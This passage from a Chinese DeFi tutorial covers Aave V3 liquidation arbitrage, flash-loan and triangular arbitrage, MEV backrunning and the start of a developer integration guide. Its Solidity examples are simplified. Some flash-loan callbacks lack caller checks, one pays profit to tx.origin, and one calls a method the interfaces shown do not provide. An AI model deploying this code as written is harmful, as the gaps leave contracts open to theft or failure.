Mode：新资产可安全测试，逐步建立信任\nPortal：打破流动性碎片化，实现多链统一\nFlash Loan：支持复杂的 DeFi 策略和套利\nOracle Sentinel：L2 网络额外保护层\n\n下一章将详细讲解套利机会和 MEV 策略。"},"blockchainguide/DApp_Development/应用场景/defi/aave/06-套利与MEV策略":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/06-套利与MEV策略","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/06-套利与MEV策略.md","title":"06-套利与MEV策略","links":[],"tags":[],"content":"Aave V3 套利与 MEV 策略\n1. 概述\nAave V3 生态中存在多种套利机会：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n策略类型资金需求技术难度风险等级清算套利中等中等中等利率套利高低低闪电贷套利无高低跨协议套利高中等中等MEV 策略高高高\n\n2. 清算套利\n2.1 清算机制回顾\n清算触发条件: 健康因子 (HF) &lt; 1\n\n清算人获利 = 获得抵押品 - 支付债务\n           = 债务 × (1 + 清算奖励) / 抵押品价格 - 债务\n\n典型清算奖励: 5-10%\n\n2.2 清算监控策略\ncontract LiquidationMonitor {\n    IPool public pool;\n    IPoolDataProvider public dataProvider;\n \n    struct UserPosition {\n        address user;\n        uint256 healthFactor;\n        uint256 totalDebt;\n        address[] collateralAssets;\n        address[] debtAssets;\n    }\n \n    // 监控用户健康因子\n    function checkLiquidation(address user) external view returns (\n        bool canLiquidate,\n        uint256 healthFactor,\n        uint256 maxProfit\n    ) {\n        (\n            uint256 totalCollateralBase,\n            uint256 totalDebtBase,\n            uint256 availableBorrowsBase,\n            uint256 currentLiquidationThreshold,\n            uint256 ltv,\n            uint256 hf\n        ) = pool.getUserAccountData(user);\n \n        healthFactor = hf;\n        canLiquidate = hf &lt; 1e18;\n \n        if (canLiquidate) {\n            // 估算最大利润\n            // 简化计算：假设 5% 清算奖励\n            maxProfit = totalDebtBase * 5 / 100;\n        }\n \n        return (canLiquidate, healthFactor, maxProfit);\n    }\n \n    // 批量扫描用户\n    function scanUsers(address[] calldata users) external view returns (\n        address[] memory liquidatableUsers,\n        uint256[] memory profits\n    ) {\n        uint256 count = 0;\n \n        // 第一遍：计数\n        for (uint256 i = 0; i &lt; users.length; i++) {\n            (bool canLiquidate, , ) = this.checkLiquidation(users[i]);\n            if (canLiquidate) count++;\n        }\n \n        // 第二遍：填充\n        liquidatableUsers = new address[](count);\n        profits = new uint256[](count);\n        uint256 idx = 0;\n \n        for (uint256 i = 0; i &lt; users.length; i++) {\n            (bool canLiquidate, , uint256 profit) = this.checkLiquidation(users[i]);\n            if (canLiquidate) {\n                liquidatableUsers[idx] = users[i];\n                profits[idx] = profit;\n                idx++;\n            }\n        }\n    }\n}\n2.3 闪电贷清算\ncontract FlashLiquidator is IFlashLoanSimpleReceiver {\n    IPool public immutable POOL;\n    ISwapRouter public immutable SWAP_ROUTER;\n \n    constructor(address pool, address router) {\n        POOL = IPool(pool);\n        SWAP_ROUTER = ISwapRouter(router);\n    }\n \n    function executeLiquidation(\n        address collateralAsset,\n        address debtAsset,\n        address user,\n        uint256 debtToCover,\n        bool receiveAToken\n    ) external {\n        // 发起闪电贷\n        POOL.flashLoanSimple(\n            address(this),\n            debtAsset,\n            debtToCover,\n            abi.encode(collateralAsset, user, receiveAToken),\n            0\n        );\n    }\n \n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external override returns (bool) {\n        require(msg.sender == address(POOL), &quot;Invalid caller&quot;);\n        require(initiator == address(this), &quot;Invalid initiator&quot;);\n \n        (address collateralAsset, address user, bool receiveAToken) =\n            abi.decode(params, (address, address, bool));\n \n        // 1. 批准池子使用债务资产\n        IERC20(asset).approve(address(POOL), amount);\n \n        // 2. 执行清算\n        POOL.liquidationCall(\n            collateralAsset,\n            asset,\n            user,\n            amount,\n            receiveAToken\n        );\n \n        // 3. 获取收到的抵押品数量\n        uint256 collateralReceived;\n        if (receiveAToken) {\n            collateralReceived = IERC20(\n                POOL.getReserveData(collateralAsset).aTokenAddress\n            ).balanceOf(address(this));\n            // 需要先取出 aToken\n            POOL.withdraw(collateralAsset, collateralReceived, address(this));\n            collateralReceived = IERC20(collateralAsset).balanceOf(address(this));\n        } else {\n            collateralReceived = IERC20(collateralAsset).balanceOf(address(this));\n        }\n \n        // 4. 将抵押品换成债务资产\n        if (collateralAsset != asset) {\n            IERC20(collateralAsset).approve(address(SWAP_ROUTER), collateralReceived);\n \n            SWAP_ROUTER.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n                tokenIn: collateralAsset,\n                tokenOut: asset,\n                fee: 3000, // 0.3% 费率池\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: collateralReceived,\n                amountOutMinimum: amount + premium, // 至少要能还贷\n                sqrtPriceLimitX96: 0\n            }));\n        }\n \n        // 5. 批准归还闪电贷\n        uint256 amountOwed = amount + premium;\n        IERC20(asset).approve(address(POOL), amountOwed);\n \n        // 6. 转移利润给发起者\n        uint256 profit = IERC20(asset).balanceOf(address(this)) - amountOwed;\n        if (profit &gt; 0) {\n            IERC20(asset).transfer(tx.origin, profit);\n        }\n \n        return true;\n    }\n}\n2.4 清算利润计算\n示例场景：\n- 用户债务: 10,000 USDC\n- 抵押品: ETH @ $1,800\n- 清算奖励: 5%\n- 闪电贷费用: 0.09%\n- DEX 滑点: 0.3%\n\n计算：\n1. 清算金额 = 10,000 × 50% = 5,000 USDC (假设 HF &gt; 0.95)\n2. 获得 ETH = 5,000 × 1.05 / 1,800 = 2.917 ETH\n3. 卖出 ETH 获得 = 2.917 × 1,800 × (1 - 0.003) = 5,234 USDC\n4. 闪电贷费用 = 5,000 × 0.0009 = 4.5 USDC\n5. 净利润 = 5,234 - 5,000 - 4.5 = 229.5 USDC (约 4.6%)\n\n\n3. 利率套利\n3.1 固定/浮动利率套利\ncontract RateArbitrage {\n    IPool public pool;\n \n    struct ArbitragePosition {\n        address asset;\n        uint256 borrowAmount;\n        uint256 fixedRate;\n        uint256 entryTime;\n        bool isActive;\n    }\n \n    mapping(address =&gt; ArbitragePosition) public positions;\n \n    // 当固定利率 &lt; 预期浮动利率时开仓\n    function openArbitrage(\n        address asset,\n        uint256 amount,\n        uint256 expectedVariableRate\n    ) external {\n        DataTypes.ReserveData memory reserve = pool.getReserveData(asset);\n \n        // 检查固定利率是否有利\n        require(\n            reserve.currentStableBorrowRate &lt; expectedVariableRate,\n            &quot;Not profitable&quot;\n        );\n \n        // 以固定利率借款\n        pool.borrow(asset, amount, 1, 0, msg.sender); // 1 = STABLE\n \n        positions[msg.sender] = ArbitragePosition({\n            asset: asset,\n            borrowAmount: amount,\n            fixedRate: reserve.currentStableBorrowRate,\n            entryTime: block.timestamp,\n            isActive: true\n        });\n    }\n \n    // 检查套利利润\n    function checkProfit(address user) external view returns (\n        int256 profit,\n        uint256 duration\n    ) {\n        ArbitragePosition memory pos = positions[user];\n        require(pos.isActive, &quot;No position&quot;);\n \n        DataTypes.ReserveData memory reserve = pool.getReserveData(pos.asset);\n \n        // 计算利率差\n        int256 rateDiff = int256(reserve.currentVariableBorrowRate) -\n            int256(pos.fixedRate);\n \n        duration = block.timestamp - pos.entryTime;\n \n        // 简化计算：利润 = 借款金额 × 利率差 × 时间\n        profit = (int256(pos.borrowAmount) * rateDiff * int256(duration)) /\n            int256(365 days * 1e27);\n    }\n}\n3.2 跨协议利率套利\ncontract CrossProtocolArbitrage {\n    IPool public aavePool;\n    ICToken public compoundMarket;  // Compound cToken\n \n    // 在 Compound 借入，在 Aave 存入\n    function aaveSupplyCompoundBorrow(\n        address asset,\n        uint256 amount\n    ) external {\n        // 检查利率差是否有利可图\n        uint256 aaveSupplyRate = _getAaveSupplyRate(asset);\n        uint256 compoundBorrowRate = compoundMarket.borrowRatePerBlock() * 2102400; // 年化\n \n        require(aaveSupplyRate &gt; compoundBorrowRate, &quot;Not profitable&quot;);\n \n        // 从 Compound 借款\n        compoundMarket.borrow(amount);\n \n        // 存入 Aave\n        IERC20(asset).approve(address(aavePool), amount);\n        aavePool.supply(asset, amount, msg.sender, 0);\n    }\n \n    // 反向操作：在 Aave 借入，在 Compound 存入\n    function compoundSupplyAaveBorrow(\n        address asset,\n        uint256 amount\n    ) external {\n        uint256 compoundSupplyRate = compoundMarket.supplyRatePerBlock() * 2102400;\n        DataTypes.ReserveData memory reserve = aavePool.getReserveData(asset);\n        uint256 aaveBorrowRate = reserve.currentVariableBorrowRate;\n \n        require(compoundSupplyRate &gt; aaveBorrowRate, &quot;Not profitable&quot;);\n \n        // 从 Aave 借款\n        aavePool.borrow(asset, amount, 2, 0, msg.sender);\n \n        // 存入 Compound\n        IERC20(asset).approve(address(compoundMarket), amount);\n        compoundMarket.mint(amount);\n    }\n \n    function _getAaveSupplyRate(address asset) internal view returns (uint256) {\n        DataTypes.ReserveData memory reserve = aavePool.getReserveData(asset);\n        return reserve.currentLiquidityRate;\n    }\n}\n\n4. 闪电贷套利\n4.1 DEX 价格套利\ncontract FlashArbDex is IFlashLoanSimpleReceiver {\n    IPool public pool;\n    ISwapRouter public uniswap;\n    ISwapRouter public sushiswap;\n \n    function executeArbitrage(\n        address tokenA,\n        address tokenB,\n        uint256 amount,\n        bool buyOnUniswap\n    ) external {\n        pool.flashLoanSimple(\n            address(this),\n            tokenA,\n            amount,\n            abi.encode(tokenB, buyOnUniswap),\n            0\n        );\n    }\n \n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external override returns (bool) {\n        (address tokenB, bool buyOnUniswap) = abi.decode(params, (address, bool));\n \n        uint256 amountOut;\n \n        if (buyOnUniswap) {\n            // Uniswap 买 → Sushiswap 卖\n            IERC20(asset).approve(address(uniswap), amount);\n            amountOut = uniswap.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n                tokenIn: asset,\n                tokenOut: tokenB,\n                fee: 3000,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: amount,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            }));\n \n            IERC20(tokenB).approve(address(sushiswap), amountOut);\n            amountOut = sushiswap.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n                tokenIn: tokenB,\n                tokenOut: asset,\n                fee: 3000,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: amountOut,\n                amountOutMinimum: amount + premium,\n                sqrtPriceLimitX96: 0\n            }));\n        } else {\n            // Sushiswap 买 → Uniswap 卖\n            // ... 类似逻辑\n        }\n \n        // 归还闪电贷\n        IERC20(asset).approve(address(pool), amount + premium);\n \n        return true;\n    }\n}\n4.2 三角套利\ncontract TriangularArbitrage is IFlashLoanSimpleReceiver {\n    IPool public pool;\n    ISwapRouter public router;\n \n    function executeTriangularArbitrage(\n        address tokenA,\n        address tokenB,\n        address tokenC,\n        uint256 amount\n    ) external {\n        pool.flashLoanSimple(\n            address(this),\n            tokenA,\n            amount,\n            abi.encode(tokenB, tokenC),\n            0\n        );\n    }\n \n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external override returns (bool) {\n        (address tokenB, address tokenC) = abi.decode(params, (address, address));\n \n        // A → B\n        IERC20(asset).approve(address(router), amount);\n        uint256 amountB = router.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n            tokenIn: asset,\n            tokenOut: tokenB,\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amount,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        }));\n \n        // B → C\n        IERC20(tokenB).approve(address(router), amountB);\n        uint256 amountC = router.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n            tokenIn: tokenB,\n            tokenOut: tokenC,\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountB,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        }));\n \n        // C → A\n        IERC20(tokenC).approve(address(router), amountC);\n        uint256 finalAmountA = router.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n            tokenIn: tokenC,\n            tokenOut: asset,\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountC,\n            amountOutMinimum: amount + premium,\n            sqrtPriceLimitX96: 0\n        }));\n \n        // 确保盈利\n        require(finalAmountA &gt;= amount + premium, &quot;Not profitable&quot;);\n \n        // 归还\n        IERC20(asset).approve(address(pool), amount + premium);\n \n        return true;\n    }\n}\n\n5. MEV 策略\n5.1 清算 MEV\ncontract LiquidationMEV {\n    IPool public pool;\n \n    // 使用 Flashbots 提交清算交易\n    function submitLiquidation(\n        address collateralAsset,\n        address debtAsset,\n        address user,\n        uint256 debtToCover,\n        uint256 minerTip\n    ) external payable {\n        // 执行清算\n        pool.liquidationCall(\n            collateralAsset,\n            debtAsset,\n            user,\n            debtToCover,\n            false\n        );\n \n        // 支付矿工小费\n        block.coinbase.transfer(minerTip);\n    }\n \n    // 计算最优 Gas 价格\n    function calculateOptimalGas(\n        uint256 expectedProfit,\n        uint256 gasUsed\n    ) external pure returns (uint256 maxGasPrice) {\n        // 留下 50% 利润作为安全边际\n        maxGasPrice = (expectedProfit * 50 / 100) / gasUsed;\n    }\n}\n5.2 Just-In-Time 流动性\ncontract JITLiquidity {\n    // 在大额交易前提供流动性，交易后撤回\n    // 注意：这是高级 MEV 策略，需要与区块构建者合作\n \n    function executeJIT(\n        address pool,\n        uint256 amount0,\n        uint256 amount1,\n        int24 tickLower,\n        int24 tickUpper\n    ) external {\n        // 1. 在目标交易前添加流动性\n        // 2. 让大额交易执行\n        // 3. 在同一区块内移除流动性\n        // 4. 收取交易费用\n \n        // 这需要与 MEV 基础设施（如 Flashbots）配合\n    }\n}\n5.3 后跑清算\ncontract BackrunLiquidation {\n    IPool public pool;\n \n    // 监听 mempool 中的价格更新交易\n    // 如果价格更新会导致清算，则后跑执行清算\n    function backrunPriceUpdate(\n        address user,\n        address collateralAsset,\n        address debtAsset,\n        uint256 expectedDebtToCover\n    ) external {\n        // 检查用户是否可清算\n        (, , , , , uint256 healthFactor) = pool.getUserAccountData(user);\n \n        require(healthFactor &lt; 1e18, &quot;Not liquidatable&quot;);\n \n        // 执行清算\n        pool.liquidationCall(\n            collateralAsset,\n            debtAsset,\n            user,\n            expectedDebtToCover,\n            false\n        );\n    }\n}\n\n6. 风险管理\n6.1 清算风险\ncontract RiskManager {\n    // 滑点保护\n    uint256 public constant MAX_SLIPPAGE = 300; // 3%\n \n    // Gas 风险控制\n    uint256 public constant MAX_GAS_PRICE = 500 gwei;\n \n    // 最小利润阈值\n    uint256 public constant MIN_PROFIT_BPS = 50; // 0.5%\n \n    function validateLiquidation(\n        uint256 debtToCover,\n        uint256 expectedCollateral,\n        uint256 currentGasPrice\n    ) external view returns (bool isValid, string memory reason) {\n        // 检查 Gas 价格\n        if (currentGasPrice &gt; MAX_GAS_PRICE) {\n            return (false, &quot;Gas too high&quot;);\n        }\n \n        // 估算利润\n        uint256 expectedProfit = expectedCollateral * 105 / 100 - debtToCover;\n        uint256 minProfit = debtToCover * MIN_PROFIT_BPS / 10000;\n \n        if (expectedProfit &lt; minProfit) {\n            return (false, &quot;Profit too low&quot;);\n        }\n \n        return (true, &quot;&quot;);\n    }\n}\n6.2 滑点保护\ncontract SlippageProtection {\n    // 计算最小输出（含滑点保护）\n    function getMinOutput(\n        uint256 amountIn,\n        uint256 expectedPrice,\n        uint256 maxSlippageBps\n    ) external pure returns (uint256) {\n        uint256 expectedOutput = amountIn * expectedPrice / 1e18;\n        return expectedOutput * (10000 - maxSlippageBps) / 10000;\n    }\n \n    // 动态滑点（根据交易规模调整）\n    function getDynamicSlippage(\n        uint256 tradeSize,\n        uint256 poolLiquidity\n    ) external pure returns (uint256 slippageBps) {\n        // 交易规模 / 池子流动性\n        uint256 impact = tradeSize * 10000 / poolLiquidity;\n \n        // 基础滑点 + 影响因子\n        slippageBps = 30 + impact * 2; // 0.3% 基础 + 动态\n \n        // 上限 5%\n        if (slippageBps &gt; 500) {\n            slippageBps = 500;\n        }\n    }\n}\n6.3 竞争风险\n清算竞争场景：\n┌─────────────────────────────────────────────┐\n│ 区块 N                                       │\n│ ├─ Tx1: Bot A 清算 (Gas: 100 gwei)          │\n│ ├─ Tx2: Bot B 清算 (Gas: 150 gwei) ← 胜出   │\n│ └─ Tx3: Bot C 清算 (Gas: 80 gwei)           │\n└─────────────────────────────────────────────┘\n\n应对策略：\n1. 使用 Flashbots 避免 Gas 竞争\n2. 私有 mempool 交易\n3. 与矿工/验证者合作\n\n\n7. 监控工具\n7.1 链下监控脚本\n// Node.js 监控示例\nconst { ethers } = require(&quot;ethers&quot;);\n \nclass AaveMonitor {\n    constructor(provider, poolAddress, dataProviderAddress) {\n        this.provider = provider;\n        this.pool = new ethers.Contract(poolAddress, POOL_ABI, provider);\n        this.dataProvider = new ethers.Contract(\n            dataProviderAddress,\n            DATA_PROVIDER_ABI,\n            provider\n        );\n    }\n \n    async scanForLiquidations(users) {\n        const liquidatable = [];\n \n        for (const user of users) {\n            const data = await this.pool.getUserAccountData(user);\n            const healthFactor = data.healthFactor;\n \n            if (healthFactor.lt(ethers.utils.parseEther(&quot;1&quot;))) {\n                liquidatable.push({\n                    user,\n                    healthFactor: ethers.utils.formatEther(healthFactor),\n                    totalDebt: ethers.utils.formatEther(data.totalDebtBase),\n                    totalCollateral: ethers.utils.formatEther(data.totalCollateralBase)\n                });\n            }\n        }\n \n        return liquidatable;\n    }\n \n    async calculateLiquidationProfit(user, collateralAsset, debtAsset, debtToCover) {\n        // 获取储备数据\n        const collateralData = await this.dataProvider.getReserveData(collateralAsset);\n        const debtData = await this.dataProvider.getReserveData(debtAsset);\n \n        // 获取用户数据\n        const userData = await this.pool.getUserAccountData(user);\n \n        // 计算预期利润\n        const liquidationBonus = collateralData.liquidationBonus; // 如 10500 = 105%\n        const collateralReceived = debtToCover\n            .mul(liquidationBonus)\n            .div(10000);\n \n        // 扣除各种费用后的净利润\n        const flashLoanFee = debtToCover.mul(9).div(10000); // 0.09%\n        const estimatedSlippage = collateralReceived.mul(30).div(10000); // 0.3%\n \n        const netProfit = collateralReceived\n            .sub(debtToCover)\n            .sub(flashLoanFee)\n            .sub(estimatedSlippage);\n \n        return {\n            grossProfit: collateralReceived.sub(debtToCover),\n            netProfit,\n            flashLoanFee,\n            estimatedSlippage\n        };\n    }\n \n    // 监听健康因子变化事件\n    async monitorHealthFactors(callback) {\n        // 监听借贷事件\n        this.pool.on(&quot;Borrow&quot;, async (reserve, user, onBehalfOf, amount, ...args) =&gt; {\n            const data = await this.pool.getUserAccountData(onBehalfOf);\n            if (data.healthFactor.lt(ethers.utils.parseEther(&quot;1.1&quot;))) {\n                callback({\n                    type: &quot;warning&quot;,\n                    user: onBehalfOf,\n                    healthFactor: ethers.utils.formatEther(data.healthFactor)\n                });\n            }\n        });\n \n        // 监听清算事件\n        this.pool.on(&quot;LiquidationCall&quot;, (...args) =&gt; {\n            callback({\n                type: &quot;liquidation&quot;,\n                args\n            });\n        });\n    }\n}\n7.2 利率套利机会扫描\nasync function scanRateArbitrage(aavePool, compoundMarkets) {\n    const opportunities = [];\n \n    for (const asset of SUPPORTED_ASSETS) {\n        // Aave 利率\n        const aaveData = await aavePool.getReserveData(asset);\n        const aaveSupplyRate = aaveData.currentLiquidityRate;\n        const aaveBorrowRate = aaveData.currentVariableBorrowRate;\n \n        // Compound 利率\n        const compoundMarket = compoundMarkets[asset];\n        const compoundSupplyRate = await compoundMarket.supplyRatePerBlock();\n        const compoundBorrowRate = await compoundMarket.borrowRatePerBlock();\n \n        // 年化\n        const BLOCKS_PER_YEAR = 2102400;\n        const compoundSupplyAPY = compoundSupplyRate.mul(BLOCKS_PER_YEAR);\n        const compoundBorrowAPY = compoundBorrowRate.mul(BLOCKS_PER_YEAR);\n \n        // 检查套利机会\n        // 策略1: Aave 存款 &gt; Compound 借款\n        if (aaveSupplyRate.gt(compoundBorrowAPY)) {\n            opportunities.push({\n                strategy: &quot;Compound借 → Aave存&quot;,\n                asset,\n                spread: aaveSupplyRate.sub(compoundBorrowAPY),\n                annualizedReturn: formatRate(aaveSupplyRate.sub(compoundBorrowAPY))\n            });\n        }\n \n        // 策略2: Compound 存款 &gt; Aave 借款\n        if (compoundSupplyAPY.gt(aaveBorrowRate)) {\n            opportunities.push({\n                strategy: &quot;Aave借 → Compound存&quot;,\n                asset,\n                spread: compoundSupplyAPY.sub(aaveBorrowRate),\n                annualizedReturn: formatRate(compoundSupplyAPY.sub(aaveBorrowRate))\n            });\n        }\n    }\n \n    return opportunities.sort((a, b) =&gt; b.spread.sub(a.spread).toNumber());\n}\n\n8. 小结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n策略优势风险推荐度清算套利利润确定、技术成熟竞争激烈、Gas 成本⭐⭐⭐⭐利率套利风险低、持续收益利率变化、资金成本⭐⭐⭐⭐⭐闪电贷套利无资金需求技术复杂、利润薄⭐⭐⭐MEV 策略利润高技术门槛高、中心化风险⭐⭐\n关键成功因素：\n\n速度：链上监控和执行速度\nGas 优化：降低交易成本\n风险控制：滑点保护和利润阈值\n基础设施：MEV 保护和私有交易\n\n下一章将提供开发者集成指南和最佳实践。"},"blockchainguide/DApp_Development/应用场景/defi/aave/07-开发者集成指南":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/07-开发者集成指南","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/07-开发者集成指南.md","title":"07-开发者集成指南","links":[],"tags":[],"content":"Aave V3 开发者集成指南\n1. 开发环境搭建\n1.1 安装依赖\n# 使用 npm\nnpm install @aave/core-v3 @aave/periphery-v3 @aave/safety-module-v3\n \n# 使用 yarn\nyarn add @aave/core-v3 @aave/periphery-v3 @aave/safety-module-v3\n \n# 使用 forge\nforge install aave/aave-v3-core aave/aave-v3-periphery\n1.2 合约地址\n以太坊主网：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n合约地址Pool0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2PoolAddressesProvider0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9ePoolDataProvider0x7B4EB56E7CD4b454BA8ff71E4518426369a138a3Oracle0x54586bE62E3c3580375aE3723C145253060Ca0C2WETHGateway0x893411580e590D62dDBca8a703d61Cc4A8c7b2b9\nPolygon：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n合约地址Pool0x794a61358D6845594F94dc1DB02A252b5b4814aDPoolAddressesProvider0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb\nArbitrum：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n合约地址Pool0x794a61358D6845594F94dc1DB02A252b5b4814aDPoolAddressesProvider0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb\n1.3 接口导入\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \nimport {IPool} from &quot;@aave/core-v3/contracts/interfaces/IPool.sol&quot;;\nimport {IPoolAddressesProvider} from &quot;@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol&quot;;\nimport {IPoolDataProvider} from &quot;@aave/core-v3/contracts/interfaces/IPoolDataProvider.sol&quot;;\nimport {IAToken} from &quot;@aave/core-v3/contracts/interfaces/IAToken.sol&quot;;\nimport {IVariableDebtToken} from &quot;@aave/core-v3/contracts/interfaces/IVariableDebtToken.sol&quot;;\nimport {IStableDebtToken} from &quot;@aave/core-v3/contracts/interfaces/IStableDebtToken.sol&quot;;\nimport {IPriceOracle} from &quot;@aave/core-v3/contracts/interfaces/IPriceOracle.sol&quot;;\nimport {DataTypes} from &quot;@aave/core-v3/contracts/protocol/libraries/types/DataTypes.sol&quot;;\nimport {IERC20} from &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;\nimport {SafeERC20} from &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;\n\n2. 基础集成\n2.1 存款\ncontract AaveSupply {\n    using SafeERC20 for IERC20;\n \n    IPool public immutable pool;\n \n    constructor(address _pool) {\n        pool = IPool(_pool);\n    }\n \n    /**\n     * @notice 存入资产到 Aave\n     * @param asset 资产地址\n     * @param amount 存款金额\n     * @param onBehalfOf 接收 aToken 的地址\n     */\n    function supply(\n        address asset,\n        uint256 amount,\n        address onBehalfOf\n    ) external {\n        // 1. 从用户转移资产\n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n \n        // 2. 授权 Pool 使用资产\n        IERC20(asset).safeApprove(address(pool), amount);\n \n        // 3. 执行存款\n        pool.supply(asset, amount, onBehalfOf, 0);\n    }\n \n    /**\n     * @notice 存入 ETH\n     */\n    function supplyETH(address onBehalfOf) external payable {\n        // 使用 WETHGateway\n        IWETHGateway gateway = IWETHGateway(WETH_GATEWAY);\n        gateway.depositETH{value: msg.value}(address(pool), onBehalfOf, 0);\n    }\n}\n2.2 借贷\ncontract AaveBorrow {\n    using SafeERC20 for IERC20;\n \n    IPool public immutable pool;\n \n    /**\n     * @notice 借出资产\n     * @param asset 借贷资产地址\n     * @param amount 借贷金额\n     * @param interestRateMode 1=固定利率, 2=浮动利率\n     */\n    function borrow(\n        address asset,\n        uint256 amount,\n        uint256 interestRateMode\n    ) external {\n        // 确保用户有足够抵押品\n        (\n            uint256 totalCollateralBase,\n            uint256 totalDebtBase,\n            uint256 availableBorrowsBase,\n            ,\n            ,\n            uint256 healthFactor\n        ) = pool.getUserAccountData(msg.sender);\n \n        require(availableBorrowsBase &gt; 0, &quot;No borrowing power&quot;);\n \n        // 执行借贷\n        pool.borrow(asset, amount, interestRateMode, 0, msg.sender);\n \n        // 转移借出的资产给用户\n        IERC20(asset).safeTransfer(msg.sender, amount);\n    }\n \n    /**\n     * @notice 使用信用委托借贷\n     */\n    function borrowWithDelegation(\n        address asset,\n        uint256 amount,\n        uint256 interestRateMode,\n        address delegator\n    ) external {\n        // delegator 必须已经授权 msg.sender 借贷额度\n        pool.borrow(asset, amount, interestRateMode, 0, delegator);\n        IERC20(asset).safeTransfer(msg.sender, amount);\n    }\n}\n2.3 还款\ncontract AaveRepay {\n    using SafeERC20 for IERC20;\n \n    IPool public immutable pool;\n \n    /**\n     * @notice 还款\n     * @param asset 债务资产地址\n     * @param amount 还款金额，type(uint256).max 表示全额还款\n     * @param interestRateMode 1=固定利率, 2=浮动利率\n     */\n    function repay(\n        address asset,\n        uint256 amount,\n        uint256 interestRateMode\n    ) external returns (uint256) {\n        // 转移资产到合约\n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n \n        // 授权 Pool\n        IERC20(asset).safeApprove(address(pool), amount);\n \n        // 执行还款\n        uint256 repaidAmount = pool.repay(asset, amount, interestRateMode, msg.sender);\n \n        // 退还多余资产\n        uint256 remaining = amount - repaidAmount;\n        if (remaining &gt; 0) {\n            IERC20(asset).safeTransfer(msg.sender, remaining);\n        }\n \n        return repaidAmount;\n    }\n \n    /**\n     * @notice 使用 aToken 还款\n     */\n    function repayWithATokens(\n        address asset,\n        uint256 amount,\n        uint256 interestRateMode\n    ) external returns (uint256) {\n        // 不需要转移资产，直接使用用户的 aToken\n        return pool.repayWithATokens(asset, amount, interestRateMode);\n    }\n}\n2.4 取款\ncontract AaveWithdraw {\n    using SafeERC20 for IERC20;\n \n    IPool public immutable pool;\n \n    /**\n     * @notice 取款\n     * @param asset 资产地址\n     * @param amount 取款金额，type(uint256).max 表示全额取款\n     */\n    function withdraw(\n        address asset,\n        uint256 amount\n    ) external returns (uint256) {\n        return pool.withdraw(asset, amount, msg.sender);\n    }\n \n    /**\n     * @notice 安全取款（检查健康因子）\n     */\n    function safeWithdraw(\n        address asset,\n        uint256 amount,\n        uint256 minHealthFactor\n    ) external returns (uint256) {\n        // 检查取款后的健康因子\n        (\n            uint256 totalCollateralBase,\n            uint256 totalDebtBase,\n            ,\n            uint256 currentLiquidationThreshold,\n            ,\n \n        ) = pool.getUserAccountData(msg.sender);\n \n        // 获取资产价格\n        address oracle = pool.getAddresses().getPriceOracle();\n        uint256 assetPrice = IPriceOracle(oracle).getAssetPrice(asset);\n \n        // 计算取款后的健康因子\n        uint256 withdrawValue = amount * assetPrice / 1e18;\n        uint256 newCollateral = totalCollateralBase - withdrawValue;\n        uint256 newHealthFactor = (newCollateral * currentLiquidationThreshold / 10000) * 1e18 / totalDebtBase;\n \n        require(newHealthFactor &gt;= minHealthFactor, &quot;Health factor too low&quot;);\n \n        return pool.withdraw(asset, amount, msg.sender);\n    }\n}\n\n3. 高级集成\n3.1 闪电贷集成\nimport {IFlashLoanSimpleReceiver} from &quot;@aave/core-v3/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol&quot;;\n \ncontract MyFlashLoanReceiver is IFlashLoanSimpleReceiver {\n    IPool public immutable POOL;\n    IPoolAddressesProvider public immutable ADDRESSES_PROVIDER;\n \n    constructor(address provider) {\n        ADDRESSES_PROVIDER = IPoolAddressesProvider(provider);\n        POOL = IPool(ADDRESSES_PROVIDER.getPool());\n    }\n \n    /**\n     * @notice 发起闪电贷\n     */\n    function requestFlashLoan(\n        address asset,\n        uint256 amount,\n        bytes calldata params\n    ) external {\n        POOL.flashLoanSimple(\n            address(this),\n            asset,\n            amount,\n            params,\n            0  // referralCode\n        );\n    }\n \n    /**\n     * @notice 闪电贷回调\n     */\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external override returns 